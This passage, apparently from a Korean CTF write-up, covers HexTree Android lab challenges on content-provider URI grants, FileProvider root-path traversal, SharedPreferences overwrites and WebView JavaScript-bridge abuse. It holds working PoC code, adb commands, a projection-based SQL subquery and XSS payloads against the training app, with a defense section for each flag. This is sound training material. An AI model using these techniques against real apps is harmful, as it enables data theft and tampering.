- 외부에서 허용할 filter 조건은 column allowlist 기반으로 제한한다.
- 숨겨야 하는 데이터는 `visible` 같은 논리 플래그에만 의존하지 말고, provider 레벨에서 호출자 권한을 검증한다.
- exported provider가 필요 없다면 `android:exported="false"`로 제한한다.

### 5. Sharing Provider Access Permissions

대상 페이지: [HexTree: Sharing Provider Access Permissions](https://app.hextree.io/courses/content-provider/grant_read_uri_permission/sharing-provider-access-permissions)

#### Flag 33 — result intent로 전달된 provider read grant 사용

Flag33에서는 provider 자체가 외부에 직접 노출되어 있지 않았다.

```xml
<provider
    android:name="io.hextree.attacksurface.providers.Flag33Provider1"
    android:enabled="true"
    android:exported="false"
    android:authorities="io.hextree.flag33_1"
    android:grantUriPermissions="true" />
```

`exported=false`이므로 외부 앱이 `content://io.hextree.flag33_1/flags`를 바로 query하면 접근 권한이 없다. 하지만 `grantUriPermissions=true`이기 때문에 앱이 Intent를 통해 특정 URI 권한을 넘기는 것은 가능하다. Android 문서에서도 `grantUriPermissions=true`이면 provider-level 권한이 있더라도 temporary permission으로 접근을 위임할 수 있다고 설명한다. [Android Developers: Create a content provider](https://developer.android.com/guide/topics/providers/content-provider-creating?hl=en)

공격 흐름은 `Flag33Activity1`에서 시작됐다. 이 Activity는 exported 상태이며, `io.hextree.FLAG33` 액션을 받은 경우 result intent에 provider URI를 넣고 읽기 권한 flag를 붙여 호출자에게 반환한다.

```text
incoming action == "io.hextree.FLAG33"
  -> resultIntent.setData(content://io.hextree.flag33_1/flags)
  -> resultIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
  -> setResult(RESULT_OK, resultIntent)
```

따라서 PoC 앱에서 `Flag33Activity1`을 `startActivityForResult()`로 호출한 뒤, `onActivityResult()`에서 반환된 `data.getData()` URI를 `ContentResolver.query()`로 조회했다.

PoC 핵심 코드는 다음과 같다.

```java
Intent request = new Intent("io.hextree.FLAG33");
request.setComponent(new ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag33Activity1"));
startActivityForResult(request, REQUEST_CODE);
```

result로 받은 URI는 다음과 같다.

```text
content://io.hextree.flag33_1/flags
```

provider 내부 쿼리는 `Flag` 테이블을 대상으로 실행되지만, `projection` 인자가 그대로 SQL `SELECT` 목록에 들어간다. 그래서 `Note` 테이블의 `flag33` content를 subquery로 읽고, 동시에 provider의 성공 조건을 만족시키기 위해 `'flag33' AS marker`를 포함했다.

```java
String[] projection = new String[] {
    "'flag33' AS marker",
    "(SELECT content FROM Note WHERE title='flag33') AS leaked_content"
};

Cursor cursor = getContentResolver().query(uri, projection, null, null, null);
```

실행 로그는 다음 형태였다.

```text
Flag33PoC: onActivityResult request=3301 result=-1 data=Intent { ... dat=content://io.hextree.flag33_1/... flg=0x1 ... }
Flag33Provider1: Flag33Provider1.query('/flags'): 1
Flag33PoC: row marker=flag33 leaked_content=HXT{...}
Flag33.1: HXT{...}
```

여기서 `flg=0x1`은 `FLAG_GRANT_READ_URI_PERMISSION`에 해당한다. Android `Intent` API 문서 기준으로 이 flag 값은 수신자가 Intent의 data URI에 대해 read 작업을 수행할 수 있게 한다. [Android Developers: Intent `FLAG_GRANT_READ_URI_PERMISSION`](https://developer.android.com/reference/android/content/Intent#FLAG_GRANT_READ_URI_PERMISSION)

#### 취약 원인

이 문제의 핵심은 `exported=false` provider 자체가 아니라, provider URI를 외부 앱에 넘기는 exported Activity였다. Activity가 호출자의 신뢰성을 확인하지 않고 result intent에 민감 provider URI와 read grant를 넣어 반환했기 때문에, 외부 앱이 임시 권한을 받아 내부 provider를 조회할 수 있었다.

또한 provider 쪽에서는 `projection`을 제한하지 않아 subquery 기반 데이터 접근이 가능했다. 권한 위임과 SQL 입력 검증 부재가 결합되면서 `Note` 테이블의 flag content까지 읽을 수 있었다.

#### 방어 방안

- provider URI를 result intent로 반환하기 전에 호출자를 검증한다.
- 민감 provider에는 `android:grantUriPermissions="true"`를 넓게 적용하지 않고, 필요한 path에만 `<grant-uri-permission>`을 제한적으로 사용한다.
- 반환할 URI는 최소 권한 원칙에 맞춰 필요한 path와 mode만 허용한다.
- `projection`은 허용 가능한 column명만 allowlist로 검증한다.
- provider 내부 DB 구조가 노출되지 않도록 table/column 접근을 명확히 분리한다.

### 6. AndroidX FileProvider

대상 페이지: [HexTree: How to Access FileProvider](https://app.hextree.io/courses/content-provider/the-androidx-fileprovider/how-to-access-fileprovider)

#### Flag 34 — 반환된 FileProvider URI로 내부 파일 읽기

Flag34는 SQLite provider가 아니라 AndroidX `FileProvider`를 이용한 파일 공유 흐름이었다. manifest에는 다음 provider가 선언되어 있었다.

```xml
<provider
    android:name="androidx.core.content.FileProvider"
    android:exported="false"
    android:authorities="io.hextree.files"
    android:grantUriPermissions="true">
    <meta-data
        android:name="android.support.FILE_PROVIDER_PATHS"
        android:resource="@xml/filepaths" />
</provider>
```

`exported=false`이므로 외부 앱이 `content://io.hextree.files/...`를 아무 권한 없이 직접 열 수는 없다. 대신 `Flag34Activity`가 result intent를 통해 특정 파일 URI와 임시 read/write 권한을 반환한다.

역분석한 `Flag34Activity.onCreate()`의 핵심 흐름은 다음과 같다.

```text
filename extra가 있으면:
  prepareFlag(context, filename)
  file = new File(getFilesDir(), filename)
  uri = FileProvider.getUriForFile(context, "io.hextree.files", file)
  resultIntent.setData(uri)
  resultIntent.addFlags(FLAG_GRANT_READ_URI_PERMISSION | FLAG_GRANT_WRITE_URI_PERMISSION)
  setResult(0, resultIntent)

filename extra가 없으면:
  secret.txt URI를 반환
```

`prepareFlag()` 내부에서는 `filename`에 `flag34.txt`가 포함되어 있을 때 실제 플래그 파일을 준비한다.

```text
if filename contains "flag34.txt":
  writeFile(context, "flags/flag34.txt", FLAG)
```

따라서 PoC 앱에서 `Flag34Activity`를 `startActivityForResult()`로 호출하면서 `filename=flags/flag34.txt`를 넘기고, result로 받은 FileProvider URI를 `ContentResolver.openInputStream()`으로 읽었다.

PoC 핵심 코드는 다음과 같다.

```java
Intent request = new Intent();
request.setComponent(new ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag34Activity"));
request.putExtra("filename", "flags/flag34.txt");
startActivityForResult(request, REQUEST_CODE);
```

result 처리 부분에서는 다음처럼 URI를 열었다.

```java
Uri uri = data.getData();
InputStream in = getContentResolver().openInputStream(uri);
```

실행 로그는 다음 형태였다.

```text
Flag34PoC: Starting Flag34Activity for result with filename=flags/flag34.txt
Flag34PoC: onActivityResult request=3401 result=0 data=Intent { dat=content://io.hextree.files/... flg=0x3 ... }
Flag34PoC: Returned URI=content://io.hextree.files/flag_files/flag34.txt flags=0x3
Flag34PoC: file_content=HXT{...}
```

`flg=0x3`은 read/write URI permission이 함께 붙은 상태다. Android 공식 문서에서도 FileProvider URI 접근 권한은 `Intent`에 `FLAG_GRANT_READ_URI_PERMISSION` 또는 `FLAG_GRANT_WRITE_URI_PERMISSION`을 포함해 수신 앱에 부여할 수 있다고 설명한다. [Android Developers: AndroidX FileProvider](https://developer.android.com/reference/androidx/core/content/FileProvider)

#### 취약 원인

직접적인 문제는 exported Activity가 외부 입력 `filename`을 신뢰해 내부 파일 경로를 만들고, 그 파일에 대한 FileProvider URI를 result로 반환한 것이다. provider 자체는 `exported=false`였지만, Activity가 read/write URI grant를 붙여 반환했기 때문에 호출 앱은 해당 파일을 열 수 있었다.

추가로 `filename` 검증이 `contains("flag34.txt")` 수준에 머물러 있어, 호출자가 원하는 하위 경로 `flags/flag34.txt`를 지정할 수 있었다. 파일 공유 기능 자체는 정상 기능이지만, 어떤 파일을 누구에게 공유할지 검증이 약하면 내부 파일 노출로 이어진다.

#### 방어 방안

- 외부에서 받은 파일명으로 `new File(getFilesDir(), filename)`을 직접 만들지 않는다.
- 공유 가능한 파일은 서버/앱이 관리하는 ID로 매핑하고, 실제 경로는 외부 입력과 분리한다.
- `contains()` 같은 부분 문자열 검증 대신 허용 목록 기반으로 정확한 파일명과 디렉터리를 검증한다.
- result intent로 FileProvider URI를 반환하기 전에 호출자 패키지/서명/권한을 확인한다.
- 필요한 경우에만 read 권한을 부여하고, write 권한은 별도 검토 없이 함께 부여하지 않는다.

#### Flag 35 — root-path 설정과 경로 이동으로 private root 파일 읽기

Flag35도 `FileProvider` 기반 문제지만, Flag34보다 위험한 설정이 추가되어 있었다. manifest에서는 별도 provider class가 사용됐다.

```xml
<provider
    android:name="io.hextree.attacksurface.providers.Flag35FileProvider"
    android:exported="false"
    android:authorities="io.hextree.root"
    android:grantUriPermissions="true">
    <meta-data
        android:name="android.support.FILE_PROVIDER_PATHS"
        android:resource="@xml/rootpaths" />
</provider>
```

`Flag35FileProvider`는 `androidx.core.content.FileProvider`를 상속하면서 `rootpaths` 리소스를 사용한다.

```text
Flag35FileProvider extends FileProvider
  -> super(R.xml.rootpaths)
```

AndroidX FileProvider 문서 기준으로 FileProvider는 XML `<paths>`에 정의된 디렉터리 안의 파일만 content URI로 만들 수 있다. [Android Developers: AndroidX FileProvider](https://developer.android.com/reference/androidx/core/content/FileProvider) 그런데 이 문제의 `rootpaths` 설정은 이름 그대로 root 쪽을 넓게 매핑하는 구성이라, 앱 private `files/` 디렉터리 밖의 파일도 URI로 만들 수 있었다.

역분석한 `Flag35Activity.onCreate()` 흐름은 Flag34와 거의 같다.

```text
filename extra가 있으면:
  prepareFlag(context, filename)
  file = new File(getFilesDir(), filename)
  uri = FileProvider.getUriForFile(context, "io.hextree.root", file)
  resultIntent.setData(uri)
  resultIntent.addFlags(FLAG_GRANT_READ_URI_PERMISSION | FLAG_GRANT_WRITE_URI_PERMISSION)
  setResult(0, resultIntent)
```

차이는 `prepareFlag()`였다. `filename`에 `flag35.txt`가 포함되어 있으면 실제 플래그를 `writeFile2(context, "flag35.txt", FLAG)`로 저장한다.

```text
if filename contains "flag35.txt":
  writeFile2(context, "flag35.txt", FLAG)
```

`writeFile2()`는 파일을 `getFilesDir() + "/../" + filename` 위치에 쓴다.

```text
getFilesDir()/../flag35.txt
```

즉 실제 파일 위치는 앱의 `files/` 하위가 아니라 앱 private root 쪽이다.

```text
/data/data/io.hextree.attacksurface/flag35.txt
```

그래서 PoC에서는 `filename` 값을 다음처럼 넘겼다.

```text
../flag35.txt
```

이 값은 `contains("flag35.txt")` 조건을 만족하고, `new File(getFilesDir(), "../flag35.txt")`가 실제 플래그 파일을 가리키게 만든다. 일반적인 FileProvider paths 설정이라면 `files/` 밖으로 나가는 파일은 URI 생성이 막혀야 하지만, root-path가 잡혀 있어서 URI가 정상 생성됐다.

PoC 핵심 코드는 다음과 같다.

```java
Intent request = new Intent();
request.setComponent(new ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag35Activity"));
request.putExtra("filename", "../flag35.txt");
startActivityForResult(request, REQUEST_CODE);
```

반환된 URI를 읽는 방식은 Flag34와 동일하다.

```java
Uri uri = data.getData();
InputStream in = getContentResolver().openInputStream(uri);
```

실행 로그는 다음 형태였다.

```text
Flag35PoC: Starting Flag35Activity for result with filename=../flag35.txt
Flag35PoC: onActivityResult request=3501 result=0 data=Intent { dat=content://io.hextree.root/... flg=0x3 ... }
Flag35PoC: Returned URI=content://io.hextree.root/root_files/data/data/io.hextree.attacksurface/flag35.txt flags=0x3
Flag35PoC: file_content=HXT{...}
```

#### 취약 원인

첫 번째 원인은 FileProvider가 지나치게 넓은 root 경로를 공유 가능 영역으로 설정한 것이다. FileProvider는 원래 앱이 명시한 제한된 경로만 공유하도록 설계되어 있는데, root-path를 사용하면 앱 private root나 다른 민감 경로까지 URI 생성 대상이 될 수 있다.

두 번째 원인은 exported Activity가 외부 입력 `filename`을 신뢰해 파일 경로를 만들고, `../` 경로 이동을 막지 않았다는 점이다. 그 결과 호출자는 `files/` 기준 상위 디렉터리의 파일을 가리키는 URI를 받아 읽을 수 있었다.

#### 방어 방안

- FileProvider XML에서 `<root-path>`처럼 지나치게 넓은 경로 매핑을 사용하지 않는다.
- `<files-path>`, `<cache-path>` 등 필요한 최소 디렉터리만 공유 대상으로 지정한다.
- 외부 입력 파일명에서 `../`, 절대 경로, URL 인코딩된 경로 이동 문자열을 차단한다.
- 파일명을 직접 경로로 쓰지 말고 내부 allowlist ID와 매핑한다.
- URI grant를 반환하는 Activity는 호출자 검증과 공유 대상 파일 검증을 모두 수행한다.

#### Flag 36 — writable FileProvider URI로 SharedPreferences 덮어쓰기

Flag36은 Flag35에서 본 root-path FileProvider 설정이 읽기뿐 아니라 쓰기에도 악용될 수 있음을 확인하는 문제였다. Android 공식 문서 기준으로 `FLAG_GRANT_WRITE_URI_PERMISSION`이 붙은 Intent를 받으면 수신자는 Intent data URI에 대해 write 작업을 수행할 수 있다. [Android Developers: Intent `FLAG_GRANT_WRITE_URI_PERMISSION`](https://developer.android.com/reference/android/content/Intent#FLAG_GRANT_WRITE_URI_PERMISSION)

먼저 Flag36 조건을 확인했다. `Flag36Activity.onCreate()`는 별도 Intent extra를 보지 않고, `Flag36Preferences`의 `solved` 값만 검사한다.

```text
Flag36Activity.onCreate():
  Flag36Preferences.getBoolean("solved", false)를 읽음
  true이면 success(this)
  false이면 "Not solved yet: solved=false" 로그 출력
```

`Flag36Preferences` 클래스도 확인했다. SharedPreferences 이름은 `Flag36Preferences`였다.

```text
PREFS_NAME = "Flag36Preferences"
context.getSharedPreferences("Flag36Preferences", 0)
```

따라서 실제로 덮어쓸 대상은 다음 파일이다.

```text
/data/data/io.hextree.attacksurface/shared_prefs/Flag36Preferences.xml
```

여기서 바로 앱 private directory에 접근할 수는 없다. 대신 Flag35에서 사용한 `io.hextree.root` FileProvider가 root-path를 넓게 매핑하고 있었고, `Flag35Activity`는 result Intent에 read/write 권한을 함께 붙여 URI를 반환했다. AndroidX FileProvider 문서에서도 FileProvider URI 접근 권한은 `grantUriPermission()` 또는 Intent flag로 read, write 또는 둘 다 부여할 수 있다고 설명한다. [Android Developers: AndroidX FileProvider](https://developer.android.com/reference/androidx/core/content/FileProvider)

PoC에서는 `Flag35Activity`를 재사용해 `files/` 기준 상위 디렉터리의 SharedPreferences 파일을 가리키도록 만들었다.

```java
Intent request = new Intent();
request.setComponent(new ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag35Activity"));
request.putExtra("filename", "../shared_prefs/Flag36Preferences.xml");
startActivityForResult(request, REQUEST_CODE);
```

반환된 URI는 다음 형태였다.

```text
content://io.hextree.root/root_files/data/data/io.hextree.attacksurface/shared_prefs/Flag36Preferences.xml
```

이 URI에 write 권한이 붙어 있었기 때문에 `ContentResolver.openOutputStream()`으로 SharedPreferences XML을 덮어썼다.

```java
String payload =
        "<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n"
        + "<map>\n"
        + "    <boolean name=\"solved\" value=\"true\" />\n"
        + "</map>\n";

OutputStream out = getContentResolver().openOutputStream(uri, "wt");
out.write(payload.getBytes(StandardCharsets.UTF_8));
out.flush();
```

실행 로그는 다음 형태였다.

```text
Flag36PoC: Starting Flag35Activity for result with filename=../shared_prefs/Flag36Preferences.xml
Flag36PoC: Returned URI=content://io.hextree.root/root_files/data/data/io.hextree.attacksurface/shared_prefs/Flag36Preferences.xml flags=0x3
Flag36PoC: Wrote solved=true to content://io.hextree.root/.../Flag36Preferences.xml bytes=113
```

한 가지 주의할 점은 `Flag36Preferences`가 static으로 초기화되는 구조였다는 것이다. `Flag36Activity`만 바로 실행하면 `initialize()`가 호출되지 않아 크래시가 날 수 있었다. 그래서 대상 앱의 `MainActivity`를 한 번 실행해 초기화한 뒤 Flag36 화면을 열었다.

```powershell
adb shell am force-stop io.hextree.attacksurface
adb shell am start -n io.hextree.attacksurface/.MainActivity
adb shell am start -n io.hextree.attacksurface/.activities.Flag36Activity
```

최종 로그는 다음처럼 성공 상태로 바뀌었다.

```text
Flag36: success() called!
Flag36: HXT{...}
```

#### 취약 원인

핵심 원인은 FileProvider URI grant가 read/write 권한을 함께 넘기고 있었다는 점이다. Flag34와 Flag35에서는 내부 파일 읽기가 주요 영향이었지만, Flag36에서는 같은 권한 조합이 앱 내부 상태 파일을 수정하는 데 사용됐다.

특히 SharedPreferences는 앱 내부 로직의 상태 판단에 직접 쓰였다. `solved=false`를 `solved=true`로 바꾸자 Activity의 검증 조건이 우회됐고, 정상 로직이 성공 상태로 처리됐다. 즉 이 취약점은 정보 노출뿐 아니라 앱 내부 무결성 훼손 문제로 이어진다.

#### 방어 방안

- FileProvider로 반환하는 URI에는 필요한 최소 권한만 부여한다. 읽기만 필요하면 write grant를 포함하지 않는다.
- `root-path`처럼 넓은 경로 매핑을 피하고, 공유 대상 디렉터리를 최소화한다.
- 외부 입력으로 파일 경로를 만들지 않는다. 특히 `../shared_prefs/`, `../databases/` 같은 private data 경로 이동을 차단한다.
- SharedPreferences, DB, 인증 토큰 등 앱 상태 파일은 FileProvider 공유 대상에 절대 포함되지 않게 분리한다.
- Activity가 FileProvider URI를 result로 반환할 때 호출자와 파일 대상을 모두 검증한다.

### 7. 배운 점

- Content Provider는 앱 내부 DB를 외부 앱에 노출할 수 있는 Android 컴포넌트다.
- `content://authority/path`에서 authority는 provider 식별자, path는 provider 내부 데이터 경로로 쓰인다.
- exported provider에 permission이 없으면 외부 앱이나 ADB에서 직접 query할 수 있다.
- `UriMatcher`는 path 라우팅을 명확하게 해주지만, 라우팅 조건 자체가 보안 검증은 아니다.
- provider의 `query()`는 단순 데이터 조회처럼 보이지만, 구현에 따라 내부 Activity 실행이나 DB update 같은 부수 효과까지 만들 수 있다.
- `selection`은 SQL `WHERE` 조건에 들어가는 입력이므로, 외부 호출자가 제어할 수 있다면 SQL Injection 공격 표면이 된다.
- 동적 값은 `selectionArgs`로 바인딩하고, column명이나 정렬 조건처럼 바인딩이 어려운 값은 allowlist로 제한해야 한다.
- `exported=false` provider도 URI grant를 받으면 외부 앱에서 접근할 수 있으므로, URI 권한을 넘기는 Activity/Intent 흐름까지 함께 봐야 한다.
- `projection`은 단순 column 선택처럼 보이지만 SQL `SELECT` 목록에 반영되므로, 검증이 없으면 subquery/constant projection 공격 표면이 된다.
- FileProvider는 `exported=false`여도 Intent URI grant를 통해 특정 파일을 외부 앱에 공유할 수 있다.
- 파일 공유 Activity는 provider 선언뿐 아니라 파일명 검증, URI grant 범위, result를 받을 호출자까지 함께 검토해야 한다.
- FileProvider의 root-path 설정은 파일 공유 범위를 과도하게 넓히므로, 경로 이동 취약점과 결합되면 앱 private root 파일까지 노출될 수 있다.
- FileProvider URI에 write grant까지 붙으면 내부 파일 읽기를 넘어 SharedPreferences 같은 상태 파일 변조로 이어질 수 있다.

### 참고 자료

1. [HexTree: Content Provider](https://app.hextree.io/courses/content-provider)
2. [HexTree: Reverse Engineering SQLite ContentProvider](https://app.hextree.io/courses/content-provider/introduction-to-provider/reverse-engineering-sqlite-contentprovid)
3. [HexTree: SQL Injection in Content Providers](https://app.hextree.io/courses/content-provider/introduction-to-provider/sql-injection-in-content-providers)
4. [HexTree: Sharing Provider Access Permissions](https://app.hextree.io/courses/content-provider/grant_read_uri_permission/sharing-provider-access-permissions)
5. [HexTree: How to Access FileProvider](https://app.hextree.io/courses/content-provider/the-androidx-fileprovider/how-to-access-fileprovider)
6. [HexTree: Insecure Root Path FileProvider Config](https://app.hextree.io/courses/content-provider/the-androidx-fileprovider/insecure-root-path-fileprovider-config)
7. [HexTree: FileProvider Write Access](https://app.hextree.io/courses/content-provider/the-androidx-fileprovider/fileprovider-write-access)
8. [Android Developers: Content provider basics](https://developer.android.com/guide/topics/providers/content-provider-basics?hl=en)
9. [Android Developers: `<provider>` manifest element](https://developer.android.com/guide/topics/manifest/provider-element)
10. [Android Developers: Create a content provider](https://developer.android.com/guide/topics/providers/content-provider-creating?hl=en)
11. [Android Developers: Intent `FLAG_GRANT_READ_URI_PERMISSION`](https://developer.android.com/reference/android/content/Intent#FLAG_GRANT_READ_URI_PERMISSION)
12. [Android Developers: Intent `FLAG_GRANT_WRITE_URI_PERMISSION`](https://developer.android.com/reference/android/content/Intent#FLAG_GRANT_WRITE_URI_PERMISSION)
13. [Android Developers: AndroidX FileProvider](https://developer.android.com/reference/androidx/core/content/FileProvider)


---

## HexTree Android Track — Android WebViews

### 1. 트랙 개요

이 트랙에서는 Android 앱 내부에서 웹 콘텐츠를 렌더링하는 `WebView`가 어떤 공격 표면이 되는지 확인한다. 특히 JavaScript 실행, 외부 URL 로딩, native bridge, XSS, file access 설정처럼 앱 코드와 웹 콘텐츠가 만나는 지점을 중심으로 분석했다.

Android 공식 문서 기준으로 `WebView.addJavascriptInterface(object, name)`은 Java 객체를 WebView의 JavaScript 컨텍스트에 주입한다. 이 객체는 지정한 `name`으로 JavaScript에서 접근할 수 있고, target API 17 이상에서는 `@JavascriptInterface`가 붙은 public method만 JavaScript에서 호출된다. [Android Developers: WebView.addJavascriptInterface](https://developer.android.com/reference/android/webkit/WebView#addJavascriptInterface(java.lang.Object,%20java.lang.String)), [Android Developers: JavascriptInterface](https://developer.android.com/reference/android/webkit/JavascriptInterface)

즉 WebView 자체는 UI 컴포넌트지만, `addJavascriptInterface()`가 들어가는 순간 웹 페이지의 JavaScript가 앱 내부 Java/Kotlin 메서드를 호출할 수 있다. 이 구조에서 앱이 신뢰하지 않은 URL을 로드하면, 외부 페이지가 앱 권한으로 동작하는 native 기능을 호출할 수 있다.

### 2. 분석 환경

- 대상 앱: `io.hextree.attacksurface`
- 테스트 기기: Android Emulator `emulator-5554`
- 분석 방식:
  - APK manifest 확인
  - dex disassembly에서 WebView 관련 클래스 확인
  - `adb shell am start`로 exported Activity에 crafted Intent 전달
  - `logcat`으로 성공 로그 확인

### 3. WebView Misconfigurations

#### Flag 38 — `@JavascriptInterface` bridge 호출

문제 요구사항은 WebView 안에서 `@JavascriptInterface`로 노출된 `success()` 계열 메서드를 호출하는 것이었다. 정적 분석 결과 실제 대상 클래스는 다음이었다.

```text
io.hextree.attacksurface.webviews.Flag38WebViewsActivity
```

manifest에서는 해당 WebView Activity가 exported 상태였다.

```text
activity io.hextree.attacksurface.webviews.Flag38WebViewsActivity
  exported=true
```

`Flag38WebViewsActivity.onCreate()` 흐름은 다음과 같았다.

```text
intent.getStringExtra("URL")을 읽음
URL extra가 없으면 file:///android_asset/flag38.html 로드
WebView JavaScript 활성화
JsObject를 "hextree"라는 이름으로 addJavascriptInterface()
WebView.loadUrl(URL)
```

핵심 코드는 다음 구조로 볼 수 있다.

```java
String url = getIntent().getStringExtra("URL");
if (url == null) {
    url = "file:///android_asset/flag38.html";
}

webView.getSettings().setJavaScriptEnabled(true);
webView.addJavascriptInterface(new JsObject(), "hextree");
webView.loadUrl(url);
```

inner class인 `Flag38WebViewsActivity$JsObject`에는 JavaScript에서 호출 가능한 메서드가 있었다.

```text
JsObject.success(boolean)
  인자가 true이면 Flag38WebViewsActivity.success() 호출
  false이면 "success(Boolean secret) requires `true` parameter" 반환
```

따라서 JS에서 호출해야 할 실제 구문은 다음이다.

```javascript
hextree.success(true)
```

`Flag38WebViewsActivity.success()`는 내부적으로 `Flag38Activity`를 실행하면서 현재 WebView Activity의 static `secret` 값을 Intent extra로 넘긴다.

```text
intent.setClass(this, Flag38Activity.class)
intent.putExtra("secret", Flag38WebViewsActivity.secret)
intent.addFlags(FLAG_ACTIVITY_NEW_TASK)
intent.putExtra("hideIntent", true)
startActivity(intent)
```

즉 공격자는 secret 값을 직접 알 필요가 없다. WebView 안에서 bridge method만 호출하면 앱이 스스로 올바른 secret을 담아 Flag38Activity를 실행한다.

#### PoC

WebView Activity가 `URL` extra를 외부에서 받을 수 있으므로, `data:` URL 안에 script를 넣어 바로 실행했다. Android shell에서 `<`, `>`, `(`, `)` 같은 문자가 깨지지 않도록 HTML payload는 URL 인코딩했다.

```powershell
adb shell am start `
  -n io.hextree.attacksurface/.webviews.Flag38WebViewsActivity `
  --es URL data:text/html,%3Cscript%3Ehextree.success%28true%29%3C%2Fscript%3E
```

디코딩하면 실제 HTML은 다음과 같다.

```html
<script>hextree.success(true)</script>
```

실행 후 `logcat`에서 다음 형태의 성공 로그를 확인했다.

```text
Flag38WebViewsActivity: success()
Flag38: success() called!
Flag38: HXT{...}
```

#### 취약 원인

첫 번째 원인은 WebView Activity가 exported 상태로 외부 앱 또는 ADB에서 직접 호출 가능했다는 점이다. 두 번째 원인은 외부 입력인 `URL` extra를 그대로 `loadUrl()`에 넘긴 점이다. 세 번째 원인은 같은 WebView에 JavaScript를 활성화하고, 앱 내부 동작을 수행하는 native bridge를 `addJavascriptInterface()`로 노출한 점이다.

이 세 조건이 결합되면 공격자는 임의 HTML/JavaScript를 WebView에 로드하고, 그 JavaScript에서 앱 내부 bridge method를 호출할 수 있다. 이번 문제에서는 `hextree.success(true)` 호출만으로 앱이 정상 성공 Activity를 실행하게 만들 수 있었다.

#### 영향

실제 앱에서 이 패턴이 인증 토큰 조회, 파일 접근, 결제 요청, 내부 Activity 실행 같은 기능과 연결되어 있다면 단순 XSS보다 영향이 커진다. JavaScript가 WebView 내부에 갇히는 것이 아니라 앱의 Java/Kotlin 메서드까지 호출할 수 있기 때문이다.

#### 방어 방안

- 외부에서 호출 가능한 Activity에서 임의 URL을 WebView에 로드하지 않는다.
- `addJavascriptInterface()`는 신뢰 가능한 고정 콘텐츠에서만 사용한다.
- bridge method는 민감 동작을 직접 수행하지 않게 설계한다.
- URL allowlist를 적용하고, `data:`, `javascript:`, `file:` 같은 위험 scheme을 차단한다.
- JavaScript가 꼭 필요하지 않으면 `setJavaScriptEnabled(false)`를 유지한다.
- WebView Activity가 외부 진입점일 필요가 없다면 `android:exported="false"`로 둔다.

#### Flag 39 — WebView XSS로 native bridge 호출

Flag39는 Flag38과 같은 `addJavascriptInterface()` 구조를 사용하지만, 공격 방식이 조금 다르다. Flag38에서는 외부에서 `URL` extra를 넣어 임의 HTML을 직접 로드했다. 반면 Flag39는 고정 asset인 `file:///android_asset/flag39.html`을 로드하고, 외부 입력 `NAME`을 페이지 초기화 데이터로 전달한다.

정적 분석한 `Flag39WebViewsActivity.onCreate()` 흐름은 다음과 같았다.

```text
intent.getStringExtra("NAME")을 읽음
WebViewClient.onPageFinished()에서 initApp(JSON)을 evaluateJavascript()로 호출
WebView JavaScript 활성화
JsObject를 "hextree"라는 이름으로 addJavascriptInterface()
file:///android_asset/flag39.html 로드
```

핵심은 `NAME` extra가 JSON 객체의 `name` 값으로 들어간 뒤, 페이지 로딩이 끝나면 다음 형태로 WebView에 전달된다는 점이다.

```java
JSONObject jsonObj = new JSONObject();
jsonObj.put("name", name);

webView.evaluateJavascript("initApp(" + jsonObj.toString() + ")", null);
```

asset `flag39.html`에서는 이 값을 안전한 text node가 아니라 `innerHTML`로 넣고 있었다.

```html
<div id="hello_name">loading...</div>
<script>
function initApp(obj) {
    console.log(JSON.stringify(obj));
    window.hello_name.innerHTML = `Hello <b>${obj.name}</b>`;
}
</script>
```

즉 `obj.name`에 HTML 태그가 들어가면 DOM으로 해석된다. 이 WebView에는 `hextree`라는 JavaScript bridge도 이미 등록되어 있으므로, XSS payload 안에서 native bridge method를 호출할 수 있다. Android 공식 문서에서도 `addJavascriptInterface()`로 주입된 Java 객체의 메서드는 JavaScript에서 접근 가능하며, untrusted content가 포함된 WebView에서 의도하지 않은 방식으로 host application을 조작할 수 있다고 설명한다. [Android Developers: WebView.addJavascriptInterface](https://developer.android.com/reference/android/webkit/WebView#addJavascriptInterface(java.lang.Object,%20java.lang.String))

Flag39의 bridge method는 인자 없이 호출하는 형태였다.

```text
Flag39WebViewsActivity$JsObject.success()
  -> Flag39WebViewsActivity.success()
  -> Flag39Activity에 secret extra를 넣고 startActivity()
```

따라서 payload는 `innerHTML`에서 실행될 수 있는 이벤트 핸들러 기반으로 구성했다. `<script>` 태그 삽입은 `innerHTML` 환경에서 기대대로 실행되지 않을 수 있으므로, 이미지 로딩 실패 이벤트를 이용했다.

```html
<img src=x onerror=hextree.success()>
```

ADB에서는 Android shell이 괄호나 `<`, `>`를 해석하지 않도록 전체 payload를 quote 처리했다.

```powershell
adb shell "am start -n io.hextree.attacksurface/.webviews.Flag39WebViewsActivity --es NAME '<img src=x onerror=hextree.success()>'"
```

실행 후 로그는 다음 형태였다.

```text
Flag39: init
Flag39WebViewsActivity: success()
Flag39: success() called!
Flag39: HXT{...}
```

#### 취약 원인

직접적인 취약점은 외부 입력 `NAME`이 HTML 컨텍스트에 escaping 없이 삽입된 것이다. `JSONObject`를 사용했기 때문에 JavaScript 문자열 경계 탈출은 어느 정도 막히지만, 최종 sink가 `innerHTML`이면 HTML Injection/XSS가 가능하다.

여기에 `addJavascriptInterface()`가 결합되면서 영향이 커졌다. 단순히 화면에 HTML을 삽입하는 수준이 아니라, XSS payload가 `hextree.success()`를 호출해 앱 내부 Java 메서드까지 실행할 수 있었다.

#### 방어 방안

- 사용자 입력은 `innerHTML`에 넣지 말고 `textContent` 또는 DOM text node로 넣는다.
- HTML 렌더링이 필요하다면 allowlist 기반 sanitizer를 적용한다.
- WebView bridge는 신뢰 가능한 페이지에서만 활성화한다.
- bridge method는 인증/권한/호출 상태를 재검증하고, 단순 JS 호출만으로 민감 동작이 실행되지 않게 한다.
- 외부 입력을 WebView 초기화 데이터로 전달할 때는 JavaScript context와 HTML context를 분리해서 검증한다.

#### Flag 40 — WebView file access 설정으로 앱 내부 파일 읽기

Flag40은 WebView의 file access 설정이 앱 private file을 읽는 경로로 이어지는 문제였다. 정적 분석 결과 `Flag40WebViewsActivity`는 외부에서 받은 `URL` extra를 WebView에 로드한다.

```text
intent.getStringExtra("URL")을 읽음
URL extra가 없으면 https://www.hextree.io 로드
WebView JavaScript 활성화
file URL 관련 접근 허용
token.txt를 앱 files 디렉터리에 생성
